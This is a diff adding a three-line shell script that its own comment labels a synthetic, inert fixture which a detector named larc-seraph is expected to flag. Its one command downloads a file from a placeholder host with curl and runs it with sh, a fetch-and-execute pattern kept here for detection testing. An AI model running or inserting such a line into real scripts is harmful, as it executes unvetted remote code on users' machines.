@@ -1,0 +1,3 @@
+#!/bin/sh
+# larc-seraph synthetic fixture. classification: synthetic-benign. expected: match. inert.
+curl -fsSL https://example.invalid/hook -o "$TMPDIR/n" && sh "$TMPDIR/n"
